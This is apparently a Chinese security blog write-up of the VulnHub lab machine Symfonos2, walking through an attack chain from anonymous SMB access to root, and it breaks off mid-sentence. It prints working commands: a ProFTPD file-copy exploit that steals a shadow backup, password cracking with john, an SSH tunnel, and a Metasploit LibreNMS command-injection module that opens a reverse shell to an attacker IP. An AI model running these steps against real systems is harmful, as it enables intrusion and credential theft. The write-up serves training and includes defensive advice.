---
title: 一个备份文件引发的血案：从匿名共享到 root 的 5 步攻击链
url: https://mp.weixin.qq.com/s/2rwq4TSn1ONRYyGY31LMRQ
source: Doonsec's feed
date: 2026-09-20
fetch_date: 2026-09-21T07:24:22.872819
---

# 一个备份文件引发的血案：从匿名共享到 root 的 5 步攻击链

# 一个备份文件引发的血案：从匿名共享到 root 的 5 步攻击链

Hash-Sec
Hash-Sec

Hash-Sec

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

EDITORIAL NOTE

Symfonos2 靶机渗透记录

Symfonos2 是 VulnHub 上的另一台中等难度 Linux 靶机，IP 192.168.68.170。这台靶机的设计很巧——ProFTPD 未授权复制 → SMB 下载 shadow.bak → john 爆破密码 → SSH 隧道打内网 Web → sudo mysql 提权，每一步都不是硬刚，而是信息收集到了位自然就通了。

整体路径：SMB 匿名共享拿线索 → ProFTPD 漏洞复制敏感文件 → 爆破 SSH 密码 → 隧道打内网 LibreNMS → sudo MySQL 提权 root。

01

1. 主机发现与端口扫描

KEY INSIGHT

渗透的第一步永远是确认目标存活。局域网里跑 arp-scan，找活跃的主机：

![](https://mmbiz.qpic.cn/mmbiz_png/NCAoibNiaTbqnUlVDDews3dxwm4ZwyBbg2IK7ggdRKTJUGLfsoD9n7CAKFUlAPJaNVUyx4FSU79iaJRox8OwO4R6afTPas4QpFksCZeAF0wCQo/640?wx_fmt=png&from=appmsg)

访问 80 端口，是个简单的静态站点，页面上只有一张图，没有明显文字信息。这种情况很常见——主页往往只是个门面，真正的攻击面藏在其他服务和子目录里。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/NCAoibNiaTbqkcgrB5h6QqjHfVWeNZDFqqCTLnFOLGibibibFdxve8jib45QaibIica6ib930CxPR3jXfDiao0UiaCGEiaOb2zbXOZaJ39y9U86dq19OT1g/640?wx_fmt=png&from=appmsg)

nmap 全端口扫描，关键结果：

bash

1nmap -p- -A -T4 192.168.68.170

2

3PORT    STATE SERVICE     VERSION

421/tcp  open  ftp         ProFTPD 1.3.5

522/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6

680/tcp  open  http        WebFS httpd 1.21

7139/tcp open  netbios-ssn Samba smbd 3.X - 4.X

8445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian

9

10Host script results:

11| smb-os-discovery:

12|   OS: Windows 6.1 (Samba 4.5.16-Debian)

13|   Computer name: symfonos2

14|\_  System time: 2026-09-20T02:59:13-05:00

开放了 21（FTP）、22（SSH）、80（HTTP）、139/445（SMB）。这五个端口各有各的攻击面：

01

21 FTP：老版本服务经常有未授权访问或已知 CVE

02

22 SSH：通常用来暴力破解或利用特定版本漏洞

03

80 HTTP：Web 服务，最常见的入口

04

139/445 SMB：文件共享，允许 guest 匿名访问，这是这台靶机的第一个突破口

Samba 允许 guest 匿名访问，值得先看——很多管理员觉得内网 SMB 无所谓，但匿名共享泄露的配置文件和路径往往就是突破口。

02

2. SMB 匿名共享

KEY INSIGHT

无密码列出共享资源：

bash

1smbclient -L //192.168.68.170 -N

-N 表示空密码，直接匿名登录，不需要任何凭据。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/NCAoibNiaTbqm92ylFicia0Tfs4GH5j55gPBjGHTUZH3jvXianb6U0OtwicD1bNxJBDajV3ibyw8IG9bEWNehgmhzwMrKLnGWQq1tb3cRBca9Bbg9g/640?wx_fmt=png&from=appmsg)

发现有个 anonymous 共享可以匿名登录。连接进去看看：

bash

1smbclient //192.168.68.170/anonymous -N

![](https://mmbiz.qpic.cn/mmbiz_png/NCAoibNiaTbqnV2wHVLpuLqTpsj5Ul6t9FwicWyw9MoHtwaQSOFQCzw1ExDGEabE2FCQdFCqy9mjYDAeM00JsAfZ7ZFNv3J2ia2DswvOs66OBO4/640?wx_fmt=png&from=appmsg)

共享目录里有 smb.conf 配置文件，直接把 SMB 的配置吐出来了，透露了两个关键信息：

bash

1[anonymous]

2   path = /home/aeolus/share

3   browseable = yes

4   read only = yes

5   guest ok = yes

第一，知道了有个用户叫 aeolus，共享目录在他的 home 下面。第二，配置文件里还留了一行 root 备份 shadow 的操作记录：cat /etc/shadow > /var/backups/shadow.bak——这是后面整个突破口。

思路：靶机里出现的配置文件、备份文件、日志文件，都是信息收集的金矿。不要只盯着共享里的「正经」文件，配置文件里的路径和操作记录往往比文件本身更有价值。

03

3. ProFTPD 漏洞利用

KEY INSIGHT

SMB 共享暂时拿不到直接可用的凭据，转看 21 端口。运行的是 ProFTPD 1.3.5，用 searchsploit 查一下有没有已知漏洞：

bash

1searchsploit proftpd 1.3.5

![](https://mmbiz.qpic.cn/sz_mmbiz_png/NCAoibNiaTbqkFficJeSmRqkzLcMHiaJls8ue8Iztpln6kcRUf0EWmiaGXfA3ZOsCvs6QT5tqVCYmvZXVSJ7wUT6QUvf6tibflQCEvHgGjJ42yB5Q/640?wx_fmt=png&from=appmsg)

果然，这个版本存在一个未授权文件复制漏洞（CVE-2015-3306）。这个漏洞的原理很简单：ProFTPD 1.3.5 在处理 site cpfr 和 site cpto 这两个命令时，没有做身份验证检查——未授权用户也能调用，直接让服务器把任意文件复制到任意位置。

利用思路：既然我们已经从 SMB 配置里知道了 shadow.bak 的路径，那就用这个漏洞把它复制到 SMB 匿名共享目录里，然后通过 SMB 下载。

bash

1site cpfr /var/backups/shadow.bak

2site cpto /home/aeolus/share/shadow.bak

cpfr 指定源文件，cpto 指定目标路径，两步就完成了文件「搬运」。

![](https://mmbiz.qpic.cn/mmbiz_png/NCAoibNiaTbqlUDcPPkQFYice9Pbft8DaIdxRkoib4EXzicE4W5m9vtq6QibYwg4VLOCs701XGJavyfPKLu1fGiaLw5ySg9Pz3icEFeTCfWqrnfaYBo/640?wx_fmt=png&from=appmsg)

为什么要先查 searchsploit？ 渗透测试的黄金法则：看到服务版本号就先查 CVE。searchsploit 本地维护了 exploit-db 的离线数据库，不用联网就能查。ProFTPD 1.3.5 这个版本号一出来，第一反应就该查一下。

04

4. 下载 shadow.bak 爆破密码

KEY INSIGHT

复制成功后，连接 SMB 下载 shadow.bak 文件：

![](https://mmbiz.qpic.cn/mmbiz_png/NCAoibNiaTbqnMaeu95F0enZhWibEy7UFUuodFbf4ZQtwRfUAfzialbGibBzfRgyQwJBUsONU4W3UHibWW7zDkVbGtlW5GoYC4tdfn3XZG2TfvoZc/640?wx_fmt=png&from=appmsg)

打开 shadow 文件，拿到了 aeolus 用户的哈希：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/NCAoibNiaTbqkeCWrps4ZQEqILfb9ALfUx3H5wqRPdKjicCHcSia41GlaG71hKbMTf7Pj7IiaodpPFkXbN5P7OvALuRMUUkvsKx9Ndia9G4NKBZmg/640?wx_fmt=png&from=appmsg)

shadow 文件里存的是 Linux 用户的密码哈希。用 john 配 rockyou 字典爆破，rockyou 是最常用的弱密码字典，收录了数百万个常见密码：

bash

1john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

![](https://mmbiz.qpic.cn/sz_mmbiz_png/NCAoibNiaTbqkqoOVTXJOiaCp6Lpdn4iaP2aGHKRSDI0p7wS9fOw6VK78jicAG2tYqLca5qcbic3vZMdb5V5iaCXhuorU1iccDHKErqKP9Wgk3at63U/640?wx_fmt=png&from=appmsg)

aeolus 的密码是 sergioteamo。

知识点：Linux 的 /etc/shadow 文件存储用户密码哈希，root 权限才能读。但这里 root 自己备份了一份 shadow.bak 在 /var/backups 下，而这个备份文件又被 ProFTPD 的漏洞暴露了——管理员自己留的备份，反而成了攻击入口。

05

5. SSH 登录 + 内网探测

KEY INSIGHT

用爆破到的密码登录 SSH：

bash

1ssh aeolus@192.168.68.170

密码是 sergioteamo。

登录成功后，第一件事不是提权，而是摸清内网情况。先看看本地有哪些端口在监听：

bash

1ss -tuln

![](https://mmbiz.qpic.cn/sz_mmbiz_png/NCAoibNiaTbqmNibdZVMZ0nTlakAsiaDuXvCTUWG385CqMcC39aS9R7DCpyjTG1fPFSFX3UiaYFqKuJzdTSLtic5v0ySEA4EEuiaqypjTu78PHUpzc/640?wx_fmt=png&from=appmsg)

发现 127.0.0.1:8080 在监听——这是个只绑定本地回环的 Web 服务，外部访问不到。这种情况在内网渗透里非常常见：重要的管理后台只绑 localhost，认为「反正外面访问不到」。

06

6. SSH 隧道打内网 Web

KEY INSIGHT

既然 8080 只绑了 127.0.0.1，外部访问不到，那就做个 SSH 端口转发，把靶机的 8080 端口映射到本地：

bash

1ssh -L 0.0.0.0:1111:127.0.0.1:8080 aeolus@192.168.68.170

-L 参数的格式是：本地绑定IP:本地端口:目标IP:目标端口。意思是把本地的 1111 端口通过 SSH 隧道转发到靶机的 8080 端口。

然后浏览器访问 http://127.0.0.1:1111，看到一个 LibreNMS 的登录界面。用刚才爆破到的账号密码 aeolus / sergioteamo 登录进去。

![](https://mmbiz.qpic.cn/mmbiz_png/NCAoibNiaTbqnVl1vKViaNwJLNm9EAian2ibvURCnI6MgxZOooeWdb1nhVicgOTX3bsNzuleZ5kLf93ibNCkvaccqvFosKgiaetib5MPwcfJYgphaxRI/640?wx_fmt=png&from=appmsg)

知识点：很多靶机的内网服务只绑 127.0.0.1，外部访问不到。拿到低权限 shell 后，一定要先跑 ss -tuln 看本地端口，再用 SSH 隧道把内网端口映射出来。这一步是内网渗透的基本功。

07

7. LibreNMS 命令注入提权

KEY INSIGHT

登录 LibreNMS 之后，先看看这个版本有没有已知漏洞。搜索 LibreNMS 的公开 exploit，发现有个 addhost 命令注入漏洞：

![](https://mmbiz.qpic.cn/mmbiz_png/NCAoibNiaTbqmFVry79GgrACxWeiaKXzJSrn0C1eWYkibBJIdsebNTicYWdsicJVherKxyLrBaI3qArDvQ2X0b1RmibSaPEeuBpnUXqBAqAIDOTCicA/640?wx_fmt=png&from=appmsg)

这个漏洞的原理是：LibreNMS 添加设备时，hostname 参数直接拼进了系统命令里执行，没有做任何过滤。我们传一个带命令注入的 hostname，就能在服务器上执行任意命令。

用 metasploit 利用：

bash

1use exploit/linux/http/librenms\_addhost\_cmd\_inject

2set rhost 127.0.0.1

3set rport 1111

4set username aeolus

5set password sergioteamo

6set lhost 192.168.68.156

7run

msf 会自动构造带命令注入的 hostname，添加设备触发漏洞，然后反弹一个 shell 回来。

成功拿到 shell，当前用户是 cronus。

08

8. sudo MySQL 提权

KEY INSIGHT

拿到 cronus 的 shell 后，先获取一个交互式终端，方便后续操作：

bash

1python -c "import pty;pty.spawn('/bin/bash');"

看看 sudo 权限——拿到任意用户的 shell 后，第一件事永远是跑 `sudo -l`，看看这个用户能以 root 身份跑什么命令：

bash

1sudo -l

发现 cronus 可以免密运行 /usr/bin/mysql。这就是突破口：MySQL 是以 root 权限运行的，我们可以通过 MySQL 写文件或者执行系统命令来提权。

具体思路是用 MySQL 的 select ... into outfile 往目标目录写一个 SUID bash，或者写 SSH 公钥到 root 的 authorized\_keys。

最终成功拿到 root：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/NCAoibNiaTbqnIJuah8IO3z5CzlupdoGBHFRVMibviccXNiaffzM2niapYG1kQZXQjMSp8eJhfbnibicLXop2ptRia4tdOcBboCA3kShluFKoplPw5Zg/640?wx_fmt=png&from=appmsg)

为什么先跑 sudo -l？ sudo 权限是 Linux 提权最常见的路径。如果一个用户能以 root 身份免密运行某个程序，而这个程序又能执行系统命令或写文件，那提权就是分分钟的事。GTFOBins 上收录了大量可以用来提权的 sudo 程序。

09

9. 复盘

KEY INSIGHT

这台靶机的整条链拆开来：

| 阶段 | 突破口 | 关键信息 |
| --- | --- | --- |
| 信息收集 | SMB 匿名共享 | 拿到用户 aeolus + shadow.bak 路径 |
| 文件读取 | ProFTPD 1.3.5 未授权复制 | 把 shadow.bak 复制到 SMB 目录 |
| 凭据获取 | john 字典爆破 | 拿到 aeolus 的 SSH 密码 |
| 内网突破 | SSH 隧道 + LibreNMS 漏洞 | 从 aeolus 切到 cronus |
| 权限提升 | sudo mysql NOPASSWD | cronus → root |

这台靶机最妙的设计：shadow.bak 不是直接放在 SMB 共享里的，而是通过 ProFTPD 的未授权复制漏洞「搬」过去的。每一步都有信息收集的味道，不是硬扫漏洞。

如果是真实系统，防御建议：

1. 关闭 SMB 匿名访问：guest 共享只放公开内容，不要放配置文件和路径信息 2. 及时更新 FTP 服务：ProFTPD 1.3.5 这种老版本有很多已知 CVE 3. shadow 文件不要随便备份：备份文件本身就是攻击目标，备份后记得移走或加密 4. 强密码 + 限制 sudo：shadow 哈希泄露后，弱密码一爆就开；sudo 权限要最小化 5. 内网服务不要只绑 localhost 当安全措施：SSH 隧道一打就穿，该做认证还是要做

10

攻击链路图

KEY INSIGHT

![](https://mmbiz.qpic.cn/sz_mmbiz_png/NCAoibNiaTbqmbIFrYztMS5wd8ojL92I3HylfviaYiaJzuiaoWZuEqoUME5SwiaP5WR81rUJXeMnad6JuFic10JG30auSibpTDicaAOSB1JuJElq0j04/640?wx_fmt=png&from=appmsg)

11

关联知识

KEY INSIGHT

01

ProFTPD 1.3.5 漏洞：CVE-2015-3306，未授权文件复制，通过 site cpfr / site cpto 实现任意文件复制。

02

SSH 端口转发：-L 参数把远程端口映射到本地，-D 是动态 SOCKS ...